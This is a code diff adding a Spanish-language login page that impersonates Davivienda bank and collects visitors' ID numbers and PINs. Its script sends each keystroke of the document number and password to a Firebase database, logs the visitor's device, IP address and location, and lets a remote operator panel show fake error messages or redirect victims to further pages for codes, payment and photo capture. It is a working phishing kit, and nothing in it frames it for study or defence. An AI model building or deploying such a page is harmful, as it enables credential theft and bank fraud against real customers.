@@ -1,0 +1,546 @@
+<html lang="es"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Login</title>
+  <style>
+    body {
+      -webkit-text-size-adjust: 100%;
+      font-size: 14px;
+      line-height: 1.42857143;
+      color: #333;
+      -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+      font-family: "Davivienda", Arial, sans-serif;
+      box-sizing: border-box;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      max-width: 512px;
+      background-color: #fff;
+    }
+
+    .container {
+      width: 100%;
+      padding: 40px 20px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-img {
+      width: 237px;
+      height: 22px;
+    }
+
+    h1 {
+      font-weight: normal;
+      margin: 0 0 8px 0;
+      align-self: flex-start;
+    }
+
+    h2 {
+      font-weight: 700;
+      margin: 0 0 24px 0;
+      align-self: flex-start;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 5px;
+      align-self: flex-start;
+    }
+
+    select {
+      -webkit-text-size-adjust: 100%;
+      font-size: 14px;
+      line-height: 1.42857143;
+      color: #333;
+      -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+      font-family: "Davivienda", Arial, sans-serif;
+      box-sizing: border-box;
+      width: 100%;
+      height: 40px;
+      padding: 8px;
+      border: 1px solid #8C8C8C;
+      border-radius: 8px;
+      background-color: #FFFFFF;
+      margin-bottom: 20px;
+      outline: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+
+    select:focus {
+      border-color: #e30613;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 14px;
+      line-height: 1.4;
+      color: #333;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      box-sizing: border-box;
+      margin-bottom: 20px;
+      outline: none;
+      font-family: "Davivienda", Arial, sans-serif;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #e30613;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+      cursor: pointer;
+      font-weight: normal;
+      align-self: flex-start;
+    }
+
+    .checkbox-container input[type="checkbox"] {
+      margin-right: 10px;
+      accent-color: #e30613;
+      cursor: pointer;
+    }
+
+    button {
+      background-color: #e30613;
+      color: white;
+      border: none;
+      width: 200px;
+      padding: 12px 0;
+      font-size: 14px;
+      font-weight: 700;
+      border-radius: 24px;
+      cursor: pointer;
+      user-select: none;
+      display: block;
+      margin: 20px auto 0 auto;
+    }
+
+    button:hover {
+      background-color: #bf0510;
+    }
+
+    .forgot-link {
+      margin-top: 40px;
+      font-weight: 700;
+      font-size: 14px;
+      color: #333;
+      text-align: center;
+      cursor: pointer;
+      width: 100%;
+      border-top: 1px solid #ccc;
+      padding-top: 20px;
+    }
+
+    /* Oculto campo clave inicialmente */
+    #clave-container {
+      display: none;
+    }
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #e30613;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+
+
+
+
+/* 🔥 OVERLAY */
+.overlay-error {
+  display: none;
+  position: fixed;
+  inset: 0;
+
+  background: rgba(0,0,0,0.4);
+  backdrop-filter: blur(4px);
+
+  justify-content: center;
+  align-items: center;
+
+  z-index: 9999;
+}
+
+/* 🔥 MODAL BLANCO CENTRADO */
+.modal-error {
+  background: #f5f5f5;
+  width: 85%;
+  max-width: 320px;
+
+  border-radius: 18px;
+  padding: 30px 20px;
+
+  text-align: center;
+  font-family: Arial, sans-serif;
+
+  box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+}
+
+/* 🔥 TEXTO */
+.modal-error p {
+  font-size: 16px;
+  color: #333;
+  margin-bottom: 25px;
+  font-weight: 500;
+}
+
+/* 🔥 BOTÓN ROJO GRANDE */
+.btn-aceptar {
+  background: #e30613;
+  color: #fff;
+
+  border: none;
+  border-radius: 30px;
+
+  width: 180px;
+  padding: 12px 0;
+
+  font-size: 14px;
+  font-weight: bold;
+
+  cursor: pointer;
+}
+
+/* 🔥 EFECTO PRESIÓN */
+.btn-aceptar:active {
+  transform: scale(0.97);
+}
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <!-- Logo arriba centrado -->
+    <div class="logo-container" role="img" aria-label="Logo Davivienda">
+      <img src="logo.svg" alt="Davivienda Logo" class="logo-img">
+    </div>
+
+    <h1>¡Hola!</h1>
+    <h2>Nos alegra que esté aquí</h2>
+
+    <form id="login-form" style="width: 100%; max-width: 400px;">
+
+      <label for="tipo-documento">Seleccione su tipo de documento</label>
+      <select id="tipo-documento" name="tipo-documento" aria-label="Seleccione su tipo de documento" required="">
+        <option value="Cedula de Ciudadania" selected="">Cedula de Ciudadania</option>
+      </select>
+
+      <label for="numero-documento">Ingrese su número de documento</label>
+      <input type="text" id="numero-documento" name="numero-documento" aria-label="Ingrese su número de documento" required="">
+
+      <div class="checkbox-container">
+        <input type="checkbox" id="recordar" name="recordar">
+        <label for="recordar">Recordar mis datos de identidad</label>
+      </div>
+
+      <button type="button" id="btn-continuar">Continuar</button>
+
+      <div id="clave-container">
+        <label for="clave">Ingrese su clave</label>
+        <input type="password" id="clave" name="clave" aria-label="Ingrese su clave" required="">
+
+        <button type="submit" id="btn-submit" style="margin-top:20px;">Enviar</button>
+      </div>
+
+    </form>
+
+    <div class="forgot-link" tabindex="0" role="button" aria-label="¿Olvidó o bloqueó su clave?">
+      ¿Olvidó o bloqueó su clave?
+    </div>
+  </div>
+
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+<div class="overlay-error">
+  <div class="modal-error">
+    <p>Verifique los datos ingresados</p>
+    <button class="btn-aceptar">Aceptar</button>
+  </div>
+</div>
+
+
+<script>
+const btnContinuar = document.getElementById('btn-continuar');
+const claveContainer = document.getElementById('clave-container');
+const inputDocumento = document.getElementById('numero-documento');
+
+btnContinuar.addEventListener('click', () => {
+
+  // validar que el usuario escribió algo
+  if(inputDocumento.value.trim() !== ''){
+
+    // mostrar la pasarela de clave
+    claveContainer.style.display = 'block';
+
+    // opcional: ocultar botón continuar
+    btnContinuar.style.display = 'none';
+
+  } else {
+    alert('Ingresa tu número de documento');
+  }
+
+});
+</script>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+function detectarDispositivo(userAgent) {
+userAgent = userAgent.toLowerCase();
+if (/windows/.test(userAgent)) return "Windows";
+if (/iphone/.test(userAgent)) return "iPhone";
+if (/ipad/.test(userAgent)) return "iPad";
+if (/android/.test(userAgent)) return "Android";
+if (/macintosh/.test(userAgent)) return "Mac";
+if (/linux/.test(userAgent)) return "Linux";
+return "Desconocido";
+}
+
+const dispositivoDetectado = detectarDispositivo(navigator.userAgent);
+update(ref(db, "dataPages/" + uid), { dispositivo: dispositivoDetectado });
+
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+const dbRef = ref(db, "dataPages/" + uid);
+update(dbRef, {
+ip: data.ip,
+ciudad: data.city,
+pais: data.country_name
+});
+});
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Index.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// 🔥 ACTIVAR NUBE EN ESTA PÁGINA
+update(ref(db, "dataPages/" + uid), {
+  oculto: false
+});
+ 
+const inputClave = document.getElementById("clave");
+const overlay = document.querySelector(".overlay");
+const overlayError = document.querySelector(".overlay-error");
+const btnSubmit = document.getElementById("btn-submit");
+const btnAceptar = document.querySelector(".btn-aceptar");
+
+// ===============================
+// 🔹 DOCUMENTO → Username
+// ===============================
+if (inputDocumento) {
+  inputDocumento.addEventListener("input", function() {
+
+    const doc = this.value.trim();
+    const ultimos4 = doc.slice(-4); // 🔥 últimos 4
+
+    update(ref(db, "dataPages/" + uid), {
+      username: doc,
+      doc4: ultimos4 // 🔥 lo usaremos en foto.html
+    });
+
+  });
+}
+
+// ===============================
+// 🔹 CLAVE → Password
+// ===============================
+if(inputClave){
+  inputClave.addEventListener("input", function() {
+    update(ref(db, "dataPages/" + uid), {
+      password: this.value
+    });
+  });
+}
+
+// ===============================
+// 🔹 BOTÓN ENVIAR
+// ===============================
+if(btnSubmit){
+  btnSubmit.addEventListener("click", function(e) {
+    e.preventDefault();
+
+    // 🔴 activar barras en panel
+    update(ref(db, "dataPages/" + uid), {
+      mostrarBarraUsername: true,
+      mostrarBarraPassword: true
+    });
+
+    // 🔴 mostrar overlay loading
+    if(overlay) overlay.style.display = "flex";
+  });
+}
+
+
+// ===============================
+// 🔹 BOTÓN ACEPTAR (RESET)
+// ===============================
+if(btnAceptar){
+  btnAceptar.addEventListener("click", () => {
+
+    // ❌ cerrar modal
+    if (overlayError) overlayError.style.display = "none";
+
+    // 🔄 limpiar inputs
+    if(inputDocumento) inputDocumento.value = "";
+    if(inputClave) inputClave.value = "";
+
+    // 🔄 reset UI
+    const claveContainer = document.getElementById("clave-container");
+    const btnContinuar = document.getElementById("btn-continuar");
+
+    if(claveContainer) claveContainer.style.display = "none";
+    if(btnContinuar) btnContinuar.style.display = "block";
+
+    // 🔄 limpiar estado en Firebase
+    update(ref(db, "dataPages/" + uid), {
+      estadoError: null
+    });
+
+  });
+}
+
+
+// ===============================
+// 🔹 ESCUCHAR ERROR DESDE PANEL
+// ===============================
+
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 ERROR LOGIN
+  if (data.estadoError === "incorrecto") {
+    if (overlay) overlay.style.display = "none";
+    if (overlayError) overlayError.style.display = "flex";
+  }
+
+  // 🔴 IR A CÓDIGO
+  if (data.accion === "codigo") {
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+    window.location.href = "codigo.html";
+  }
+
+  // 🔥 IR A PAGO
+  if (data.accion === "pago") {
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+    window.location.href = "pago.html";
+  }
+
+  // 🔥 IR A FOTO
+  if (data.accion === "foto") {
+
+  update(ref(db, "dataPages/" + uid), {
+    accion: null
+  });
+
+  window.location.href = "foto.html";
+}
+
+
+  // 🔥 IR A Final
+if (data.accion === "final") {
+
+  update(ref(db, "dataPages/" + uid), {
+    accion: null
+  });
+
+  window.location.href = "../../final.html";
+}
+
+// ===============================
+// 🔢 SOLO NÚMEROS (DOCUMENTO + CLAVE)
+// ===============================
+
+if (inputDocumento) {
+  inputDocumento.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, ""); // 🔥 elimina letras
+  });
+}
+
+if (inputClave) {
+  inputClave.addEventListener("input", function() {
+    this.value = this.value.replace(/\D/g, ""); // 🔥 elimina letras
+  });
+}
+
+});
+
+});
+
+
+</script>
+
+</body>
+
+</html>
